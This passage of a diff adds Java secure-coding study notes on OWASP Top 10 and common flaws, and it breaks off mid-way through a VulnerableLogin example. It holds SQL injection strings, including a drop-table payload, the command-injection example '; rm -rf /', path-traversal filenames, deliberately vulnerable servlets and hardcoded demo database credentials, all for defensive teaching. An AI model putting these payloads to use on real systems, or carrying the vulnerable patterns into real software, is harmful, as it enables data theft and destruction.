@@ -1,0 +1,2706 @@
+Security is one of the most important non-functional requirement whenever we build appl. We might have a very strong appl, we might have very strong infrastructure but one small flaw can break security and thats where its very important that architects, developers, testers and functional users are aware about the security 
+
+OWASP(Open Web Application Security Project) Top 10
+     OWASP is non profit security organization which does analysis into security and provides a list called OWASP top 10 which gives an overview of what are major security flaws that are present in an application
+
+1. Broken Access Control
+2. Cryptographic Failures
+3. Injection
+4. Insecure Design
+5. Security Misconfiguration
+6. Vulnerable and Outdated Components
+7. Identification and Authentication Failures
+8. Software and Data Integrity Failures
+9. Security Logging and Monitoring Failures
+10. Server Side Request Forgery (SSRF)
+
+
+Security vulnerabilities in java based applications   
+    It is very important for the java developers who are working on the java based applications and this session is focusing on the What are the security vulnerabilities found in the Java based applications which will have high impact and severity on the appl.
+   To produce high secure and reliable software below are the key security concerns found in the Java based application
+
+1. SQL Injection
+2. Unclosed resources/memory leaks
+3. Directory traversal attack/Malicious file upload
+4. Cross site scripting
+5. Password management(logging, hard coding,weak pwd)
+6. Poor logging
+7. Improper exception handling
+8. Improper validation on user inputs
+
+so these are the often security vulnerabilities generated due to improper code written by the developer
+
+
+1. SQL Injection
+      It is an attack how the attacker can inject the malicious statement as part of the user input
+
+eg:
+
+public static void getEmpList(int empId,String empName) throws SQLException {
+   stmt=conn.createStatement();
+   String query="select * from employee where empId="+empId+" and empName='"+empName+"'";
+//empName=siva' or 1=1
+//empName=siva' OR 1='1
+//empName=''; Drop table user
+   ResultSet rs=stmt.executeQuery(query);
+   while(rs.next()) {
+         //iterate through resultset
+   }
+   System.out.println("Inserted record into employee table successfully");
+
+//better way to handle SQL Injection using PreparedStatement
+   query="select * from employee where empId=? and empName=?";
+   PreparedStatement ps=con.prepareStatement(query);
+   ps.setInt(1,empId);
+   ps.setString(2,empName);
+   rs=ps.executeQuery();
+   while(rs.next()) {
+         //iterate through resultset
+   }
+}
+
+empId and empName let us consider these are the inputs coming from the user,  for example where we have HTML page for empId we have textfield and for empName we have another textfield, where user can manually enter the empid, empname and based on that we are trying to retrieve the employee details. So now what the attacker can do is, here we are preparing sql stmt by concatating the user inputs, now what attacker can do is instead of Employee Name they can construct some malicious sql statement in the user input and they can  pass along the user's input
+    eg: empName=siva' or 1=1
+
+when you execute this sql statement against the database, then what happens is 1=1 always it will be returned, so it's going to return  all the employees who are available in the Employee table
+
+This is the one type of SQL Injection here the intention of the attacker is to see what are all the records available in the database that can be injected into the SQL statement along with the user input 
+    The other way is the attacker can still include the delete statements or drop statements or update statement, so whenever the attacker can use the SQL
+statements which is going to be embedded as part of the user input, then our SQL database will
+behave in a different way, so our application is compromised some of the security
+aspect, so we need to make sure that we should develop an application in such a way that our code should be SQL injection free.
+    How SQL injection free we can develop, is we always make sure that we use the PreparedStatement to execute the SQL Statements. How PreparedStatement will work is first you're going to define the query where you're going to place the placeholder for the user inputs with question mark and you are going to set the variable
+for this place holders. So when you preparing SQL query using PreparedStatement, the setInt and setString automatically take care of all this SQL injection (ie) the vendor who provides the implementation for this they are taken care of all SQL Injection related use cases and it will make sure that there will be no SQL
+Injection happening wile executing the queries using the PreparedStatement 
+
+What is the impact?
+1. An attacker can inject malicious SQL code in the user input
+2. An attacker can view sensitive data stored in the database
+   For example when you consider a user table where you're going to store user IDs and password, if it compromising sql injection then attacker can see all the userID and password which is stored in the database
+3. An attacker can bypass the authentication/authorization checks
+    For example we have user table where we are checking userid and pwd, so the attacker give like password=' ' or 1=1, then no authentication will happen, authentication and authorization can automatically bypass and see the data even they are not authorized 
+4. An attacker can update/delete/drop the tables data based on the type of the SQL injection
+
+How to avoid it?
+1. Proper input validation
+    Always make sure that you have the proper input validation on the user input, whatever the user is entering you make sure that it should not have any sql stmt in that and also you should not have single apostrophe in the columns where we are using as part of the sql stmt and the columns using where condition
+
+2. Always use the PreparedStatement to execute the SQL stmts instead of preparing the SQL query by appending the user inputs directly to the SQL query
+
+3. If we use any source code analyser tools like SonarLint/SonarQube/FindBugs in the dev env. These tools analyse the source code and provide feedback to the developer if it found any SQL injections found in the source code 
+    When ever you are coding particular program then SonarLint or the FineBugs automatically give the warnings about the SQL Injections that are found during the development phase itself, so that it can be corrected in the development phase itself and it  will
+significantly reduce the development cost 
+
+2. Unclosed resources/Memory leaks
+      In Java a Memory Leaks can happen when your code holds a reference permanently, so that some object is never garbage collected. This is called as a Memory Leaks 
+   Now Whenever we are developing an applications many places we're going to use the database connection and 
+We're going to handle file operations, so this are consider as a resource. So If we talk about the classes implementing the interface of java.io.Closeable interface from JDK1.5 and java.lang.AutoClosable
+which is from jdk 1.7 onwords, those represent as external resources and those needs to be close immediately after we use, if we don't close these resources, then resources are available in the heap memory or the objects are available in the memory so it is never going to garbage collected so as a result it is going to have a huge impact on the performance as well as sometimes JVM goes out of memory error
+     So unclosed resources will have the high impact on the application reliability hence during the development faces itself we need to make sure what ever the resources we're using must be closed properly. 
+
+Example For This A Memory Licks: 
+    Connection objects, Statement and ResultSet and the IO stream operations 
+
+	Whenever we use this type of objects in our application we need to make sure that we have to close them immediately after using it
+
+What is the impact?
+1. Most operating systems limits the number of open files.If we fail to close ur streams then GC may take a very long time to close them for you, the net result may be that u run out of system file descriptors and ur code fails to open one more file
+      Most OS is going to limit the number of files (ie) some file system might have a limit of 100 files at a time they can open. So if OS having those types of restrictions, when you're using java code to open
+those files, once you reached the maximum limit of what an operating system allows then u cannot open further.
+Also the garbage collector if you don't close
+the file that garbage collectors will keep all those references in the memory, as a result heap memory size is going to be occupied by all the files that are open in the application. Hence we need to make sure that when you're working with the IO Streams always you need to close it once u have utilized the resources using finally block
+
+2. Similar issue for opening many db connections/statements
+    Whenever you are opening connection with the database and preparing statements, then the database will also have the number of open connections limitation for the number of Connections as well as for the Statement. Once you use the Connections,Statements and the ResultSet make sure that you close immediatelly, otherwise JVM will goes out of the memory and finally it's going to crash the application 
+
+How To Avoid It ?
+1. For classes implementing java.io.Closeable, java.lang.AutoCloseable must close the resources using finally block, from JDK1.7 onwards we use try with resources
+
+    In the previous example getEmpList(), I am preparing a statement using the Statement and ResultSet, but we never close it. So if you don't close it, then the references for the Statement, Connection and ResultSet all this is going to be available in the in the Heap Memory and never going to be collected by the Garbage collector. So heap memory is going to be
+occupied by all these resources so we need to make sure that whenever you open a Connection, File
+and the stream,PreparedStatement and  ResultSet you need to close immediate. If you're using JDK 1.7 Java provides a concept of Try with Resources which automatically closes
+
+private static void insertEmp(int empId, String empName) throws Exception {
+    String query="insert into Employee values(?,?)";
+    //better handling of resource closing
+    try(Connection con=createConnection();
+        PreparedStatement ps=con.prepareStatement(query);) {
+         ps.setInt(1,empId);
+         ps.setString(2,empName);
+         ps.executeUpdate();
+     }
+}
+
+2. Use any source code analyser tools like SonarLint/SonarQube/FindBugs in the dev env. These tools analyse the source code and provide feedback to the developer if it found any resources are not closed in the source code
+
+
+3. Directory Traversal attack/Malicious File uploads
+       One of the key area where the attackers will able to attack the application using the directory traversal and the file upload
+
+1. Directory traversal is also known as the ../ attack, directory climbing and backtracking
+    The attacker trying to attack the file system on the server (ie) attacker trying to upload and download an file, eventhough they are not authorized to upload and download the
+file 
+   The goal of this attack is to affect the appl to gain unauthorized access to the file system
+     How It Happens in order to upload and download the file, first user has to pass the path for that application where he has to download and the upload 
+    For Example if you see 
+www.vulnerabilities.com/filename=input.txt so here it is directly taking the filename and it will try to download from the application. But attacker can think in a different way and pass some malicious filename like
+   filename=../../../../../../../passwords.txt
+
+In case of Unix they know what is the root folder of the file, somehow the Attacker can identify by providing the path, it's like a climbing and backtracking anything is possible for the attacker, so based on that attacker can identify particular path where appl security resides like password.txt or Operating System secure files where we have the access control list, we also can gain an access to it by guessing the file name and the attacker can download it 
+
+eg:
+
+public static void fileTraversalAttack(String filename) throws IOException {
+       FileOutputStream fileOutStream=null;
+       FileInputStream in=null;
+       try {
+           filename="input.txt";
+           fileOutStream = new FileOutputStream(filename);
+           fileOutStream.write("adafafsfasdfasdf".getBytes());
+           System.out.println("Content written to the file successful");
+           filename="..\\..\\..\\test.txt";
+
+           File input=new File(filename);
+           in=new FileInputStream(input);
+           System.out.println(in);
+           int content;
+           while((content=in.read()) != -1) {
+                System.out.print((char)content);
+           }
+           System.out.println("Reading content from the file successful");
+        }
+        catch(IOException e) {
+            System.out.println("Exception occured while read/writing");
+        } finally {
+              if(in!=null) {
+                  in.close();
+                  fileOutStream.close();
+              }
+          }
+}
+
+
+For example the application expected like filename is always must be directly given, so what happens is whenever we give file as input.txt, the application is going to be storing the file in the particular path  which is a reference to the absolute path or relative path to the application folder where all the attachments are going to be stored.  
+    Now while downloading the file, attacker can give the filename like 
+     filename="..\\..\\..\\test.txt"; 
+But if we don't provide any validation against the path whichever coming from the user, then attacker can go and give any path and attacker can gain access on this particular directory and get the files on that particular folder, as the result our application is compromised the
+Security and provide the access to the different folders and different files on the system even if the user is not authorized to do so
+    In order to handle the Directory Traversal Attacks, we always make sure that filename and the path wherever it is coming make sure that you have validated it and you
+need to make sure that the path is available under the system, at the same time the user is authorized to access the particular file and the particular folder. If you don't handle this one, then our application will have a high threat because malicious people can upload any number of files, at the same time they can copy and download it, hence we need to make sure that our application and the program free of directory traversal attack 
+     Also it is possible that they can upload malicious files (ie) exe files and a file with huge size for example 100gb file, as the result our server might be going
+Out of Memory and finally crash the server 
+
+How to avoid it?
+1. Must place the validations to check filename contains ../ or ..\
+     If it's content then we need to make sure that whatever the path user has is referring whether really a valid path
+on our server  which is authorized to access by the particular user or not, if not than we need
+to need to reject the application download or upload 
+
+2. Must check for file extensions, allowed special characters in the file name, filename length etc
+
+3. Must verify file path coming in the request is absolute path or relative path and do validatiob against the relative path configured in app
+   If it is an absolute path then we need to make sure
+that the absolute path whatever user is providing is authorized to access it or not
+
+4. Must have validations against the file upload size
+       We need to take care of file upload size, 
+before you are going to upload to the server otherwise the attacker can upload a huge number of the files, as the result our appl crashes
+
+
+4. Cross site scripting
+      This is the vulnerability which oftenly seeing in the client browser, so the Cross Site Scripting happens by injecting the Javascripts into a webpages viewed by the other users 
+    So the intention of the cross-site scripting attack is it's going to inject some Java base script which is going to identify the authorization of the particular user who are authorized to view the website.
+     Inorder to happen the Cross Site Scripting Attack, there are 3 things it requires
+1. The Attacker 
+2. we need to identify the Vulnerablity Website
+3. victim (ie) a user of vulnerability website
+     Now let us consider I am the user of facebook,when I login into facebook the attacker can identify that there is cross site scripting attack, now they can inject some JS into website, once they are injected and whenver we logged in facebook the JS code what attacker have injected will execute and it will steal some of the authentication information from my profile and send to the attacker. The attacker will take that authorization code and they can get my credential and login into my account 
+       That's the type of attack found in the most of the Web based applications 
+       XSS attack can happen in 2 ways 
+1. Non-persistent
+      In case of non-persistent what happens is, the attacker keep on observing in the particular website is having a security vulnerability, whenever the user of that website login, the attacker can inject some script into the website which steals the information about the authentication cookies and send an email to the user of vulnerable website saying please click on this link for more details 
+     If the user clicks, then it will navigate to the vulnerability website and the user is login into the website, so whenever he logins automatically javascript which is included by attacker will be executed and it will steal the info about the user and passed to the attacker. Now using that authentication cookie now attacker can login into vulnerable website and can take the control of the actual user  
+
+2. Persistent
+     The persistent attack will happen during the comments. For example I logged into facebook and add a comment, if the website is vulnerable one then he can include some Javascript in the comment itself 
+     So when we comment something to PersonA and when PersonA login into facebook and click on the comment then the script along with comment will execute and steals the authentication cookie of the particular user and send back to the attacker
+
+5. Password management (logging and hard coding passwords in the source code and weak password)
+     
+1. Appl must have a strong pwd policy(pwd contains combination of special characters, numbers, lower/uppercase letters with minimum length of 9)
+      Our application Authentication and the Security Depends upon how secure and how complexity password we are allowing for our application. If we are allowing a user to
+select weak passwords, the attackers can easily identify those passwords and they can logging into our application and steal the user information. Hence our application must have a strong password policy to handle this type of attacks 
+
+2. Sensitive information like passwords, creditcards, SSN must not print on loggers
+      When you're developing a program never give the password information in the logs, it might be the password, the CreditCard PIN etc 
+
+3. Never hardcode DB password, IP address, app server admin credentials in the source code  
+     Most of the times our application will talk to the Database and always make sure that your passwords related to the DB Connection or  application server, never stores any information in the source code because if you store the information in the source code then some attackers can decompile your source code and see credentials related to DB connection or appl server 
+     Even unauthorized people can go and access your source code repository and easily identify the information and they can do some activity at the Source Control or they can attack the database or they can attack the application server also
+      When you're using the file handling for your application in order to connect it to FTP or SMTP or the servers you're going to use their credentials, so those type of information never hard code anything in the source code. Instead we have a configuration file where we encrypt those files and put it in the particular configuration folder which will reduce the guessing of passwords 
+
+
+4. Proper ACL(Access Control List) in place to authenticate/authorised to access the resources on the server 
+     Having a proper Access Control List to have access to the particular file system 
+
+
+6. Poor Logging
+1. Adding proper loggers in the appl makes maintainence of the appl easy
+       So adding loggers to our application while developing the appl will make a developer life easy in terms of maintainence. If we dont add the loggers then if any issue comes in the production then it very difficult to troubleshoot the issue 
+
+2. Adding more logger to the appl results into performance overhead in the appl
+      At the same time if we add everything in loggers then it is going to impact the performance of the appl, because adding the logger will have an IO operation it will cost to you, so whenever we are adding logs in the appl make sure that you take wise decision 
+
+3. Never log PII to the loggers
+      Never log any sensitive information like Personal Identification Information 
+
+4. Add proper logs when an exception thrown/catch in the appl
+      We have to add proper logger whenever we catch an exception, so if something goes wrong with our appl, we have proper logs where exactly the exception in happening and what is the root cause for this
+
+4. Take wise decision while adding logger level(error,info,debug, trace, warn, all)
+        Whenever we add particular line of stmt in the java code we need to judge which level we are going to use, so that it will be easily helpful for the maintainence perspective, at the same time it should not cause any performance impact and also we should give any meaningful info to the developer to identify the issue 
+
+7. Improper exception handling
+          This will have a high impact on the appl, because exception is going to stop the normal flow of the execution, by handling the exception properly we are going to provide a user friendly message to enduser regarding the failures which are happening in the appl, hence we need to make sure that we have proper exception handling takes place 
+
+1. Never shallow the exception 
+       For example whenever we are working with IO files, we got IOException and we handle it, but we are rethrowing FileNotFoundException or SQLException which is not expected behaviour, whatever exception we got the same exception have to rethrow it 
+
+2. Exception handling order should be from specific exception type to generalized one
+    For example if we are working with IO streams, it has thrown FileNotFoundException so first we need to handle FileNotFoundException, then IOException and then Exception. We should not add generalized exception for everything, if we handle that way and someone tries to understand ur code then he dont have any content of what exception is thrown or he has to goes through all the lines of the code 
+
+3. Never catch Throwable Exception
+      Throwable is going to catch all the exceptions including the errors, even if JVM crashes also it is going to catch it 
+
+4. Cleanup resources always after the catch block using finally block
+
+5. Never catch exception in finally block 
+
+6. Better to use try with resources to clean up the resources
+
+7. Add proper log before throw/catch the exception
+
+8. Make sure NullPointerException handled properly 
+      NPE will have hihg impact on ur appl so whenever u r using operation on top of any object make sure the object should be always not null and always check for not null condition before we are operating anything on the object
+
+
+8. Improper validations on user input 
+1. Your appl takes integer but user can pass as String then need to have the proper validation to check for String to Integer conversion 
+2. Validation against the filename\file extensions\file size
+3. Validation against the length of the user input etc
+4. Validation against the null value for the user inputs
+
+
+OWASP Top 10 principle 
+
+1. A01:2021 – Broken Access Control is the top vulnerability listed in the OWASP Top 10 – 2021, which highlights the most critical security risks to web applications.
+
+Broken access control moves up from the 5th position back in 2017 which is previous version of owasp top 10, and the appl that are tested for different security threads by owasp organization, 94% of appl had some form of broken access control
+        Consider we have an appl and we have users that want to access the appl, but we also have attackers who are trying to do bad things to the appl and we want to let these good users in and we want to block the bad attackers. So there should be some kind of access controls that built in ur appl and one of the issues with this is that, there are so many different endpoints and that needs to be control around the appl to let the good people in and keep the bad people out
+     So failures around access control will lead to things like information disclosure, information modification and these attackers may delete all ur data. 
+     Consider we have an api endpoint like mail.example.com/messages/1234, so if we change that id to 5678, so behind the scene it is typically a sql or database call that something like
+  select id,data from messages where id=1234
+So now if we change id as 5678 then that would change the structure of this or change the contents of this sql message which is not good, so we could add few info like 
+  select id,data from messages where id=1234 and messages.owner=owner
+   So point here is we not only check the id is correct but also the actual owner who can access that message, so now we are doing some extra check to put control on the access to who can gain access to that api endpoint 
+    We have some common access control vulnerabilities like violation of principle of least privilege where access should only be granted to users or roles, but instead its given to anyone, so the least privilege is basically give someone the least amount of privilege that they need to do their job, but if that starts to expand then we have problem
+   Another is when we bypass access control checks by modifying the url or html page or using some kind of attack tool to modify api requests. 
+   Another is viewing or editing of someone else account by providing unique identifier 
+   Next is accessing an api with missing access controls for post,put and delete, so if we dont have controls around the methods that the api is able to handle 
+   Next is force browsing to unauthenticated pages as an unauthenticated users. For example example.com/app/get_info so if we get to that url as unauthenticated user which is not good beacuse we are getting info about the app. At the same time if we access example.com/app/admin_getInfo so if u r not adming then we should not able to get data, so this is one of unauthenticated user should not be able to get to either one of these and non admin should not be able to get 2nd url, so some people can force browse to these urls and if we gain access then thats a problem 
+     So we can deny by default, then we can implement access control mechanisms once and reuse them throughout the appl. We also should enforce record ownership rather than accepting the user can create or read or update or delete any record, so we need to enforce record owership. Next is log access control failures which is like monitoring and logging, but we need to log these failures 
+    So good access control features are hard to add to an appl late in the development lifecycle so make sure we start this early on development lifecycle 
+
+What is Broken Access Control?
+Broken Access Control occurs when a web application fails to properly enforce restrictions on what authenticated users are allowed to do. This means users can access, modify, or delete data or perform actions outside their intended permissions.
+
+Types of Access Control:
+1. Vertical Access Control- 	Restrict access based on roles (e.g., user vs admin).
+2. Horizontal Access Control-	Restrict access to resources owned by the user (e.g., user cannot view another user's order).
+3. Context-Based Access Control-	Restrict actions based on the current state or other factors (e.g., time, IP, MFA).
+
+Common Examples of Broken Access Control:
+Example	Description
+1. IDOR (Insecure Direct Object Reference)-	Changing userId in URL to access another user’s data.
+2. Forced Browsing-	Manually accessing admin or restricted URLs not linked in the UI.
+3. Privilege Escalation-	Gaining admin rights by modifying a role parameter or cookie.
+4. Missing Function-Level Access Control	API endpoints lack checks to verify the user’s role.
+
+How Attackers Exploit It:
+1. Change parameters like /account/123 to /account/124.
+2. Use tools like Burp Suite to intercept and modify requests.
+3. Invoke admin-level APIs directly.
+4. Guess object IDs or paths.
+
+How to Prevent It:
+1. Deny by default – Only allow explicitly permitted actions.
+2. Enforce access control on server-side – Never rely on client-side checks.
+3. Use role-based access controls (RBAC) – Define what each role can do.
+4. Avoid exposing internal object references – Use random IDs or access tokens.
+5. Implement secure session management – Tie access checks to authenticated users.
+6. Log and monitor failed access attempts.
+
+Scenario: View User Profile by ID
+Users log in with just their username (simulated).
+They are redirected to view their own profile.
+An attacker can change the userId in the URL to view other profiles — this is Broken Access Control.
+
+🔓 Vulnerable Code Example (Broken Access Control)
+
+✅ index.jsp (Simple Login Form)
+
+<html>
+<head><title>Login</title></head>
+<body>
+    <h2>Login</h2>
+    <form action="/A01/LoginServlet" method="post">
+        Username: <input type="text" name="username" /><br/>
+        <input type="submit" value="Login" />
+    </form>
+</body>
+</html>
+
+
+LoginServlet.java
+
+package com.example;
+
+import javax.servlet.*;
+import javax.servlet.http.*;
+import java.io.IOException;
+
+public class LoginServlet extends HttpServlet {
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String username = req.getParameter("username");
+
+        // Simulated login: no password
+        HttpSession session = req.getSession();
+        session.setAttribute("username", username);
+
+        // Simulate user ID assignment
+        if ("alice".equals(username)) {
+            session.setAttribute("userId", 101);
+        } else if ("bob".equals(username)) {
+            session.setAttribute("userId", 102);
+        }
+
+        resp.sendRedirect("/A01/ProfileServlet?userId=" + session.getAttribute("userId"));
+    }
+}
+
+ProfileServlet.java (Vulnerable)
+
+package com.example;
+
+import javax.servlet.*;
+import javax.servlet.http.*;
+import java.io.IOException;
+import java.io.PrintWriter;
+
+public class ProfileServlet extends HttpServlet {
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        int requestedUserId = Integer.parseInt(req.getParameter("userId"));
+
+        // ❌ No ownership check
+        resp.setContentType("text/html");
+        PrintWriter out = resp.getWriter();
+        out.println("<h2>User Profile</h2>");
+        out.println("<p>Viewing profile of user ID: " + requestedUserId + "</p>");
+    }
+}
+
+
+- 
+- Run index.jsp and enter input as alice and it will  redirects to /profile?userId=101
+
+- Manually change the URL to:
+
+http://localhost:8086/A01/ProfileServlet?userId=102
+
+Without the secure check, you’ll see Bob’s profile — Broken Access Control.
+
+- Now we fix ProfileServlet to apply broken access control
+
+package com.example;
+
+import javax.servlet.*;
+import javax.servlet.http.*;
+import java.io.IOException;
+import java.io.PrintWriter;
+
+public class ProfileServlet extends HttpServlet {
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        int requestedUserId = Integer.parseInt(req.getParameter("userId"));
+
+        HttpSession session = req.getSession(false);
+        if (session == null || session.getAttribute("userId") == null) {
+            resp.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Please login");
+            return;
+        }
+
+        int sessionUserId = (int) session.getAttribute("userId");
+
+        // ✅ Access control check - validate the ownership
+        if (requestedUserId != sessionUserId) {
+            resp.sendError(HttpServletResponse.SC_FORBIDDEN, "Access denied");
+            return;
+        }
+
+        resp.setContentType("text/html");
+        PrintWriter out = resp.getWriter();
+        out.println("<h2>User Profile</h2>");
+        out.println("<p>Viewing your profile, user ID: " + sessionUserId + "</p>");
+    }
+}
+
+- Run index.jsp and enter input as alice and it will  redirects to /profile?userId=101
+
+- Manually if we change the URL to:
+
+http://localhost:8086/A01/ProfileServlet?userId=102 then it will showing access denied
+
+
+
+2. A02:2021	Cryptographic Failures
+
+A02:2021 – Cryptographic Failures is the second most critical web application security risk in the OWASP Top 10 - 2021. It was previously known as Sensitive Data Exposure, but the new name focuses on root causes: failures in implementing cryptography properly.
+
+This shifts up one position to number 2 from the previous version, in fact previously it is called as sensitive data exposure, but sensitive data exposure is more of broad symptom rather than like a root cause, so the focus really on failures related to cryptography which lead to exposure of sensitive data 
+      When we think about cryptographic failures is the protection of data that we have in ur appl, sp data in transit or data at rest. For examples passwords or credit card number or personal info number etc, so if we have sensitive data then we need to  determine the protection needs of that data. 
+     So when we build the appl we can use any kind of cryptographic algorithms or protocols and if we dont have any encrpyption then always use https.
+     Next we can use key mgt which is the server certificate and trust chain is properly validated. Next dont write crypto on ur own, always use trusted libraries 
+
+Example:
+    Consider we have users who are accessing ur appl and this appl is connected to database which contains credit card information. So user access the appl and then appl sends an sql query to database, then the response (ie) credit card number, comes back from the db back to the user in decrypted and user pulls the data out of the database. If a attacker comes and perform an SQL injection attack and grab credit card number out of database which is automatically decrypted, then attacker would have access to that credit card number. So it is an example of cryptographic failure, in this case good to use encryption but bad to use automatic decryption 
+
+Example 2:
+   Consider we have variety of url and first one uses https which is good and another url uses only http, so we dont enforce tls or encryption for every single page on ur appl. So here attacker could listen to all of the traffic and if user accesses 2nd url then attacker could see all of that data which is not good, so we have enforce https across all urls
+
+So finally if we have ur appl and we need to classify the data which is sensitive and which data maybe not sensitive. Next is dont store sensitive data unnecessarilt discard it as soon as possible, next encrypt all of ur sensitive data and rest back to database and no automatic decryption
+
+What is a Cryptographic Failure?
+Cryptographic Failures occur when data is not properly protected in transit or at rest, due to missing or weak encryption, poor key management, or flawed implementations.
+
+Common Examples of Cryptographic Failures:
+1. No encryption -	Transmitting sensitive data (e.g., passwords, tokens, PII) over HTTP instead of HTTPS.
+2. Weak algorithms	- Using outdated algorithms like MD5, SHA-1, or RC4.
+3. Broken encryption logic	 - Hardcoded keys or IVs, poor randomness, or incorrect cipher modes (e.g., ECB).
+4. Poor key management -	Storing keys in code, not rotating keys, or insecure key generation.
+5. Insecure password storage	- Storing plain text or unsalted/unslowed hashes.
+6. Insecure TLS/SSL setup -	Using expired, self-signed, or weak certificates.
+
+🛡️ How to Prevent Cryptographic Failures
+1. Use HTTPS everywhere - Never allow HTTP for login or sensitive pages.
+2. Store passwords securely - Use bcrypt, scrypt, or Argon2. Never store plain text passwords.
+3. Use strong algorithms -	E.g., AES with GCM mode, RSA-2048 or stronger, SHA-256 or better.
+4. Manage keys securely -	Use HSMs, key vaults, and avoid hardcoding keys.
+5. Enable TLS properly	 - Avoid outdated protocols like TLS 1.0/1.1.
+6. Encrypt sensitive data at rest	- Especially if PII, health, or financial data.
+7. Don’t roll your own crypto - 	Always use well-vetted libraries (e.g., Bouncy Castle, Java Cryptography Architecture).
+
+Real-World Example
+Vulnerable Java Code – Plain Text Password Storage
+
+// BAD PRACTICE: Storing passwords in plain text
+String username = request.getParameter("username");
+String password = request.getParameter("password");
+
+// Store directly in DB
+String sql = "INSERT INTO users (username, password) VALUES (?, ?)";
+PreparedStatement stmt = conn.prepareStatement(sql);
+stmt.setString(1, username);
+stmt.setString(2, password); // ❌ NO hashing
+stmt.executeUpdate();
+
+✅ Secure Java Code – Hashed Password Storage Using BCrypt
+
+import org.mindrot.jbcrypt.BCrypt;
+
+String username = request.getParameter("username");
+String password = request.getParameter("password");
+
+// Hash the password before storing
+String hashed = BCrypt.hashpw(password, BCrypt.gensalt());
+
+// Store securely
+String sql = "INSERT INTO users (username, password) VALUES (?, ?)";
+PreparedStatement stmt = conn.prepareStatement(sql);
+stmt.setString(1, username);
+stmt.setString(2, hashed);
+stmt.executeUpdate();
+
+
+1. Create maven project with bcrypt dependency
+
+<dependency>
+    <groupId>org.mindrot</groupId>
+    <artifactId>jbcrypt</artifactId>
+    <version>0.4</version>
+</dependency>
+
+2. Create db
+
+CREATE DATABASE demo;
+USE demo;
+CREATE TABLE users (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    username VARCHAR(255),
+    password VARCHAR(255)
+);
+
+3. Create InsecurePasswordstorage in plain text
+
+public class InsecurePasswordStorage {
+    public static void main(String[] args) {
+        try {
+            String username = "user1";
+            String password = "password123"; // Plain text
+
+            Connection conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/demo", "root", "root");
+            String sql = "INSERT INTO users (username, password) VALUES (?, ?)";
+            PreparedStatement stmt = conn.prepareStatement(sql);
+            stmt.setString(1, username);
+            stmt.setString(2, password); //Vulnerable
+            stmt.executeUpdate();
+
+            System.out.println("Insecurely stored credentials.");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+4. Run prg and check table it will be stored in plain text
+
+5. Create SecurePasswordStorage using BCrypt
+
+public class SecurePasswordStorage {
+    public static void main(String[] args) {
+        try {
+            String username = "user2";
+            String password = "securePassword456";
+
+            // Hash using BCrypt
+            String hashed = BCrypt.hashpw(password, BCrypt.gensalt());
+
+            Connection conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/demo", "root", "root");
+            String sql = "INSERT INTO users (username, password) VALUES (?, ?)";
+            PreparedStatement stmt = conn.prepareStatement(sql);
+            stmt.setString(1, username);
+            stmt.setString(2, hashed); // Securely hashed
+            stmt.executeUpdate();
+
+            System.out.println("Securely stored credentials.");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+6. Run prg and check table it will be stored in encrypted text
+
+
+
+3. A03:2021 – Injection
+
+A03:2021 – Injection is one of the most well-known and critical vulnerabilities listed in the OWASP Top 10 – 2021. This category includes various types of injection attacks, such as SQL Injection, Command Injection, LDAP Injection, NoSQL Injection, etc.
+
+Injection goes down to 3rd position, in fact in 2003 this is number one on the list. When people talk about injection they talk about SQL injection, but injection is broader it is not just sql injection, we have LDAP and we can do injection attack with that or OGNAL(Object Graph Navigation Library) injection attacks etc. Also cross site scripting has been combined and it is part of this injection risk
+     So typically applications are vulnerable to injections when user supplied data is not validated or filtered. Consider we have users that are sending input and ur appl reads and then takes action, so when user supplied data is not validated by the appl then we are opening urself for injection attack 
+
+    Consider a code snippet
+
+public Person find_Unsecure(String inputFromUser){
+   return jdbcTemplate.queryForObject("select * from person where name="+inputFromUser, new BeanPropertyRowMapper<Person>(Person.class));
+}
+
+So here we are taking an input from the user and we are directly appending it to our sql stmt, so what would happen if the input from user is something like Ram or 1=1, then the query would become
+  select * from person where name=Ram or 1=1
+then every row from person table would be returned back which is not good practise and this is called as SQL Injection. But this method is protected because we are using a BeanPropertyRowMapper and try to map it to one person, but if we map into List of persons then this would have a serious security flaw 
+    So here we are taking input from user and directly using it in a query without validating it. So as far as SQL is concerned the best way to do it using parametrized queries, so we use ? and make sure that value is passed into the name  
+    
+public Person find_Secure(String inputFromUsre){
+   return jdbcTemplate.queryForObject("select * from person where name=?", new Object[]{inputFromUser}, new BeanPropertyRowMapper<Person>(Person.class));
+}
+
+So now the query look like
+  select * from person where name='Ram or 1=1'
+So here it will look for that specific name. So the base of preventing SQL injection is by using parameterized queries but in general the way we can prevent any of injections is by validating the data which is provided by the user 
+    In LDAP samething happens instead of interacting with database, it interacts with LDAP server 
+    To wrap up on preventing injection it really requires keeping the data separate from the commands and query. Next always we use server side input validation, also parameterize ur queries whenever we can, use of limit command where it is not loading the entire data
+
+What is Injection?
+Injection occurs when untrusted input is sent to an interpreter as part of a command or query, tricking the interpreter into executing unintended commands or accessing unauthorized data.
+
+Common Types of Injection:
+1. SQL Injection	- Injecting malicious SQL queries (e.g., ' OR '1'='1 to bypass login).
+2. Command Injection -	Running OS commands (e.g., ; rm -rf /) through vulnerable code.
+3. LDAP Injection	- Manipulating LDAP queries.
+4. NoSQL Injection -	Exploiting NoSQL queries (MongoDB, etc.).
+5. HTML/JS Injection (XSS)	Often treated separately under XSS, but technically a type of injection.
+
+How to Prevent Injection:
+1. Use prepared statements - 	Use parameterized queries (JDBC PreparedStatement, JPA, etc.).
+2. Validate and sanitize input - 	Whitelist input patterns and length checks.
+3. Use ORM frameworks -	Hibernate, JPA reduce direct query risk.
+4. Use stored procedures (carefully)	Only if they do not include dynamic SQL.
+5. Escape data for interpreters	For shell, XML, HTML, etc.
+6. Apply least privilege	DB accounts should not have unnecessary permissions.
+
+ 1. VulnerableLogin.java — ❌ SQL Injection-Prone
+
+package com.example;
+
+import java.sql.*;
+import java.util.Scanner;
+
+public class VulnerableLogin {
+    public static void main(String[] args) {
+        Scanner scanner = new Scanner(System.in);
+        System.out.print("Username: ");
+        String username = scanner.nextLine();
